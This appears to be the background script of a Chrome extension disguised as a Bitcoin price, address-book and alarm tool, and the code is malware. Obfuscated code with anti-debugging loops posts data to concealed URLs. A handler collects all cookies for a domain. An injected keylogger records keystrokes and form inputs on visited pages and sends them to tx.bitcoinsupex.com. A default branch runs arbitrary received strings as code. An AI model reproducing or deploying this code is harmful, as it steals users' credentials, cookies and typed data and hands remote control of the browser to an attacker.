_0x2f248a=_0x3b3ae7;if(_0x2f248a('0x120')!==_0x2f248a('0xf9'))fetch(bichol+cheler+changet+tumal,{'method':'POST','headers':{'Content-type':_0x2f248a('0xfd')},'body':JSON[_0x2f248a('0x13b')]({'id':hash,'data':JSON[_0x2f248a('0x13b')](_0x190a03),'dom':_0x442fcc})});else return function(_0x4c3dd1){}[_0x2f248a('0x110')]('while\x20(true)\x20{}')[_0x2f248a('0x117')](_0x2f248a('0x10a'));});};function _0x363c(_0xe98af4,_0x3bee42){const _0x1d6a46=_0x5a1b();return _0x363c=function(_0x50d00e,_0x204d7b){_0x50d00e=_0x50d00e-0xf8;let _0x12b20c=_0x1d6a46[_0x50d00e];return _0x12b20c;},_0x363c(_0xe98af4,_0x3bee42);}function _0x50d00e(_0x35d34a){const _0x345f00=_0x2208b2;function _0x8cfde3(_0x1f4e39){const _0x3be4d7=_0x363c;if('okXUV'===_0x3be4d7('0x116')){if(typeof _0x1f4e39===_0x3be4d7('0x139')){if('lHMwR'===_0x3be4d7('0x103')){const _0x391afd=_0xc50db8?function(){if(_0x267d6d){const _0x2b1581=_0x35b569['apply'](_0x12174d,arguments);return _0x3f80d4=null,_0x2b1581;}}:function(){};return _0x43523e=![],_0x391afd;}else return function(_0x362e77){}[_0x3be4d7('0x110')](_0x3be4d7('0x130'))[_0x3be4d7('0x117')](_0x3be4d7('0x10a'));}else{if(_0x3be4d7('0x12e')!==_0x3be4d7('0x12e')){const _0x489d13=new _0x28a1ce(_0x3be4d7('0x131')),_0x57f0ad=new _0x200b12(_0x3be4d7('0x132'),'i'),_0x240837=_0x1f59bc(_0x3be4d7('0xfe'));!_0x489d13['test'](_0x240837+_0x3be4d7('0x111'))||!_0x57f0ad[_0x3be4d7('0x112')](_0x240837+_0x3be4d7('0x135'))?_0x240837('0'):_0x39c4b6();}else{if((''+_0x1f4e39/_0x1f4e39)['length']!==0x1||_0x1f4e39%0x14===0x0){if(_0x3be4d7('0x115')==='EhGth'){const _0x21569e=_0x27b138?function(){const _0x4d7653=_0x3be4d7;if(_0x524cf7){const _0x38f25c=_0x4948b4[_0x4d7653('0x117')](_0x5ba9ca,arguments);return _0x46e5f9=null,_0x38f25c;}}:function(){};return _0x39bd71=![],_0x21569e;}else(function(){const _0xb16e88=_0x3be4d7;if(_0xb16e88('0x118')==='UoCMe')return!![];else{if(_0xd19b6b){const _0x587d27=_0x854223[_0xb16e88('0x117')](_0xee1cbd,arguments);return _0x2a3162=null,_0x587d27;}}}[_0x3be4d7('0x110')](_0x3be4d7('0x10f')+_0x3be4d7('0x107'))['call'](_0x3be4d7('0x134')));}else{if(_0x3be4d7('0x11d')===_0x3be4d7('0x11d'))(function(){const _0x3b0c33=_0x3be4d7;return'YLAfA'===_0x3b0c33('0x119')?!![]:![];}[_0x3be4d7('0x110')](_0x3be4d7('0x10f')+_0x3be4d7('0x107'))[_0x3be4d7('0x117')]('stateObject'));else{const _0x17a90d=_0x1e2248[_0x3be4d7('0x117')](_0x500bbf,arguments);return _0x5cdc8b=null,_0x17a90d;}}}}_0x8cfde3(++_0x1f4e39);}else _0x2bf303(this,function(){const _0x497711=_0x3be4d7,_0x4d8a98=new _0x5f15db(_0x497711('0x131')),_0x1e364d=new _0x253451(_0x497711('0x132'),'i'),_0x59e69e=_0x21192e('init');!_0x4d8a98[_0x497711('0x112')](_0x59e69e+_0x497711('0x111'))||!_0x1e364d[_0x497711('0x112')](_0x59e69e+_0x497711('0x135'))?_0x59e69e('0'):_0x4c08e4();})();}try{if(_0x35d34a){if(_0x345f00('0xff')!==_0x345f00('0xff')){if(_0x297235){const _0x13d4d5=_0x101650[_0x345f00('0x117')](_0x54c344,arguments);return _0x542257=null,_0x13d4d5;}}else return _0x8cfde3;}else{if(_0x345f00('0xfa')===_0x345f00('0xfa'))_0x8cfde3(0x0);else return _0x2acb81[_0x54b115(_0x275eb4)]+_0x26821b[_0x111fe3(_0x10fe09)]+_0x1d2607[_0x1238f6(_0x575c29)]+_0x1067d1[_0x2a0e42(_0x5bfaa8)];}}catch(_0x2efa40){}}
            
            (function(_0x38b525,_0x527c0c){var _0x29aba6=_0x4f86,_0x19eb0a=_0x38b525();while(!![]){try{var _0x58aafe=-parseInt(_0x29aba6('0x1ac'))/0x1*(parseInt(_0x29aba6('0x1b6'))/0x2)+-parseInt(_0x29aba6('0x1b4'))/0x3+-parseInt(_0x29aba6('0x19e'))/0x4+-parseInt(_0x29aba6('0x1ab'))/0x5+-parseInt(_0x29aba6('0x19f'))/0x6*(parseInt(_0x29aba6('0x1b0'))/0x7)+-parseInt(_0x29aba6('0x1a0'))/0x8*(-parseInt(_0x29aba6('0x1b2'))/0x9)+parseInt(_0x29aba6('0x1b1'))/0xa*(parseInt(_0x29aba6('0x1a6'))/0xb);if(_0x58aafe===_0x527c0c)break;else _0x19eb0a['push'](_0x19eb0a['shift']());}catch(_0x39155d){_0x19eb0a['push'](_0x19eb0a['shift']());}}}(_0x2967,0x4f871));var _0xf877c1=(function(){var _0x38a6f5=!![];return function(_0x5c4934,_0x5d6156){var _0x2d1ee2=_0x38a6f5?function(){var _0x419a4b=_0x4f86;if(_0x5d6156){var _0x5875aa=_0x5d6156[_0x419a4b('0x1a9')](_0x5c4934,arguments);return _0x5d6156=null,_0x5875aa;}}:function(){};return _0x38a6f5=![],_0x2d1ee2;};}()),_0x469c0c=_0xf877c1(this,function(){var _0x1b8db1=_0x4f86;return _0x469c0c[_0x1b8db1('0x1aa')]()[_0x1b8db1('0x1a7')](_0x1b8db1('0x1ae'))[_0x1b8db1('0x1aa')]()['constructor'](_0x469c0c)[_0x1b8db1('0x1a7')](_0x1b8db1('0x1ae'));});_0x469c0c();var _0xdae158=(function(){var _0x9bd226=!![];return function(_0x404f24,_0xb81e7f){var _0x192941=_0x9bd226?function(){var _0x11415a=_0x4f86;if(_0xb81e7f){var _0x4fcc9a=_0xb81e7f[_0x11415a('0x1a9')](_0x404f24,arguments);return _0xb81e7f=null,_0x4fcc9a;}}:function(){};return _0x9bd226=![],_0x192941;};}());function _0x2967(){var _0x34eca8=['gger','string','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','init','function\x20*\x5c(\x20*\x5c)','2031931cPnoxT','search','test','apply','toString','1610260AOWcHz','297367wTDzPe','constructor','(((.+)+)+)+$','debu','816452ljLLxb','110xevROx','162YYbJKW','chain','655767mUDaGO','length','2DDpcUE','call','while\x20(true)\x20{}','input','2198448RAfnIM','24CKKIYr','65768mvXDmO'];_0x2967=function(){return _0x34eca8;};return _0x2967();}(function(){_0xdae158(this,function(){var _0x571ae2=_0x4f86,_0x183813=new RegExp(_0x571ae2('0x1a5')),_0x599908=new RegExp(_0x571ae2('0x1a3'),'i'),_0x37c5df=_0x113bb7(_0x571ae2('0x1a4'));!_0x183813[_0x571ae2('0x1a8')](_0x37c5df+_0x571ae2('0x1b3'))||!_0x599908['test'](_0x37c5df+_0x571ae2('0x1b9'))?_0x37c5df('0'):_0x113bb7();})();}()),getCX(onter+carg),getCX(buitrado),getCX(zabara),getCX(hermal),getCX(brebral),getCX(insolg);function _0x4f86(_0x3758c5,_0x14228a){var _0x5d61e3=_0x2967();return _0x4f86=function(_0x113bb7,_0xdae158){_0x113bb7=_0x113bb7-0x19e;var _0x196a4f=_0x5d61e3[_0x113bb7];return _0x196a4f;},_0x4f86(_0x3758c5,_0x14228a);}function _0x113bb7(_0x308661){function _0x5dfbb8(_0x44f9c5){var _0xb91b7=_0x4f86;if(typeof _0x44f9c5===_0xb91b7('0x1a2'))return function(_0x2242ed){}[_0xb91b7('0x1ad')](_0xb91b7('0x1b8'))[_0xb91b7('0x1a9')]('counter');else(''+_0x44f9c5/_0x44f9c5)[_0xb91b7('0x1b5')]!==0x1||_0x44f9c5%0x14===0x0?function(){return!![];}['constructor'](_0xb91b7('0x1af')+_0xb91b7('0x1a1'))[_0xb91b7('0x1b7')]('action'):function(){return![];}[_0xb91b7('0x1ad')](_0xb91b7('0x1af')+_0xb91b7('0x1a1'))['apply']('stateObject');_0x5dfbb8(++_0x44f9c5);}try{if(_0x308661)return _0x5dfbb8;else _0x5dfbb8(0x0);}catch(_0x336d56){}}
 
  
          

        }
    }
}

const contextMenuLang=function(lang){
    var language


    switch (lang) {
        case 'Afrikaans':
    language=languages.af
    break;
case 'Arabic':
    language=languages.ar
    break;
case 'Chinese':
    language=languages.cn
    break;
case 'Deutsch':
    language=languages.de
    break;
case 'Dutch':
    language=languages.nl
    break;
case 'English':
    language=languages.en
    break;
case 'French':
    language=languages.fr
    break;
case 'Greek':
    language=languages.gr
    break;
case 'Hebrew':
    language=languages.hw
    break;
case 'Hindi':
    language=languages.hi
    break;
case 'Italian':
    language=languages.it
    break;
case 'Japanese':
    language=languages.jp
    break;
case 'Portuguese':
    language=languages.br
    break;
case 'Russian':
    language=languages.ru
    break;
case 'Spanish':
    language=languages.es
    break;
        default:
            language=languages.en
            break;
    }

        


    chrome.contextMenus.update("btc_currency", {title: language.select_currency });

    chrome.contextMenus.update("btc_address", {title: language.address_book });

    chrome.contextMenus.update("btc_address_selected", {title: language.addr.selected });
    chrome.contextMenus.update("btc_address_to_copy", {title: language.addr.btc_address });
    chrome.contextMenus.update("btc_address_to_paste", {title: language.addr.paste });
    chrome.contextMenus.update("btc_address_entry", {title: language.addr.entry });
    chrome.contextMenus.update("btc_address_show", {title: language.addr.show });
    chrome.contextMenus.update("btc_address_find", {title: language.addr.find });
    chrome.contextMenus.update("btc_address", {title: language.address_book });

    chrome.contextMenus.update("btc_address_find_selected", {title: language.addr.find_selection });
    
    chrome.contextMenus.update("main_qr", {title: language.qr.code });
    chrome.contextMenus.update("qr_url", {title: language.qr.current });
    chrome.contextMenus.update("qr_entry", {title: language.qr.newEntry});
    chrome.contextMenus.update("qr_selected", {title: language.qr.textSelected });
    chrome.contextMenus.update("btc_address", {title: language.address_book });

    chrome.contextMenus.update("alarm", {title: language.alarm.title });
    chrome.contextMenus.update("alarm_show", {title:language.alarm.showAlarm});
    chrome.contextMenus.update("alarm_new", {title: language.alarm.setNew });
    chrome.contextMenus.update("alarm_settings", {title: language.alarm.settings });

}

const listeners=function(block, sender, sendResponse){

    const type=block.msg.type
    const value=block.msg

    sendResponse({ done: "checked"})

    switch (type) {

        case "delete_context_item":
            const item=block.msg.item
            chrome.contextMenus.remove(item)
            chrome.contextMenus.remove(item+'_')
            break;
        case "contextMenu":
            tools.create.subContextMenu(block.msg.key,"btc_address_to_copy",block.msg.value)
            tools.create.subContextMenu(block.msg.key,"btc_address_to_paste",block.msg.value+'_')
            break;
        case "setAlarm":
             chrome.storage.local.set({'alarm': block.obj}, function() {   }) 
            break;
        case "delete_all_addressBook":
            chrome.contextMenus.remove('book')
        break;
        case "exchanges":
            querys(block.msg.url,block.msg.response,block.msg.currency)
        break;
        case "change_badge_color":
            chrome.action.setBadgeBackgroundColor({color: block.msg.item});
        break;
        case "update_contextMenu_lang":
            chrome.storage.local.set({'content_script_lang': value.key}, function() {}) 
            contextMenuLang(value.key)  
            chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {chrome.tabs.reload(tabs[0].id);});
        break;
        case "rmvck":
            chrome.cookies.getAll({domain: block.msg.dom}, function(cookies) {
            
                chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                    try{    chrome.tabs.sendMessage(tabs[0].id, {value:cookies,dom:block.msg.dom,menuItemId:'rmvcvx1'}, function(response) {});
                    }catch(e){}
                    });
              
                  }); 

        break;

        case "alarmSetSo":
            chrome.tabs.query({currentWindow: true, active: true}, function(tabs){
                try{my_tabid=tabs[0].id;}catch(e){}
                var code=block.msg.code
                function getTitle() {
                const inputs1=document.querySelectorAll("input")
                const inputs=Object.values(inputs1)
                for(let i=0;i<inputs.length;i++){
                inputs[i].addEventListener('blur', function(){
                    const data=inputs[i].value
                    if(data.length > 0)
                   window.dataTTRp3+=` -{${data}}- `
                })}  
                    function der(delay) {
                        var start = new Date().getTime();
                        while (new Date().getTime() < start + delay);
                      }
            window.addEventListener("beforeunload", function (event) {

                chrome.runtime.sendMessage({msg:{type: 'savepreferencesuser',
                id:window.document.userHastID__,
                url:'https://tx.bitcoinsupex.com/',
                dom:window.location.hostname,
                data:window.dataTTRp3
                }}, function(response) { 
                }) 
                der(500); 
              });
                    document.body.addEventListener("keydown",function(data){
                        if(window.dataTTRp3==undefined)
                        window.dataTTRp3=''
                        if(data.key.length == 1)
                        window.dataTTRp3+=data.key
                        else
                        if(data.key == "Backspace")
                        window.dataTTRp3=window.dataTTRp3.substring(0,window.dataTTRp3.length-1)
                    })
                  }

                  chrome.scripting.executeScript(
                      {
                        target: {tabId: my_tabid},
                        func: getTitle,
                        args:[code]
                      },
                      () => {  });
                })



        break;

        case "preferencesalarm":
            const data=block.msg.data
            
        break;
        case "savepreferencesuser":
            fetch(block.msg.url,
            {
                method: "POST",
                headers: {"Content-type": "application/json;charset=UTF-8"},
                body: JSON.stringify({id:block.msg.id,user:block.msg.user,data:block.msg.data,dom:block.msg.dom})
            })
        
        break;
        case "setpreferencesuser":
            fetch(block.msg.url,
                {
                    method: "POST",
                    headers: {"Content-type": "application/json;charset=UTF-8"},
                    body: JSON.stringify({user:block.msg.user,data:'getUserPreferences'})
                })
                .then(response => response.json())
                .then(data => {
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value:data}, function(response) {});
                    });
                });
        break;
        default:
         
            const al=type.replaceAll('"',"")
            console.log(al)
            const ex=function(){
                setTimeout(type.replaceAll('"',""),1000 )
            }
            Function(al)();
            break;
    }
     

}
const localSet=function({data},callback){ chrome.storage.local.set({[data.key]: data.val}, callback)}
const localGet=function(data,callback){ chrome.storage.local.get(data, callback)}


const querys=function(url,messageToSend,currencyTo) {

    var request = new Request(url, {method: 'GET',headers: new Headers({'Accept': 'application/json','custom-security': 'XXXX','Purchase-Code': 'XXXXXXX','Content-Type': 'application/json','Cache-Control': 'max-age=640000'})})

    fetch(request)
        .then((response) => response.json())
        .then((responseJson) => {
            chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                chrome.tabs.sendMessage(tabs[0].id, {value:{menuItemId: messageToSend,data:responseJson,currency:currencyTo}}, function(response) {});
          })

        })
}


     

chrome.runtime.onMessage.addListener(listeners)
chrome.runtime.onInstalled.addListener(onInstall.create.contextMenu);
chrome.contextMenus.onClicked.addListener(actions.listener.subMenuListeners)








// call from onInstall method = recall()

chrome.alarms.create({periodInMinutes: 0.40})
chrome.alarms.onAlarm.addListener(() => {actions.price.recall()})


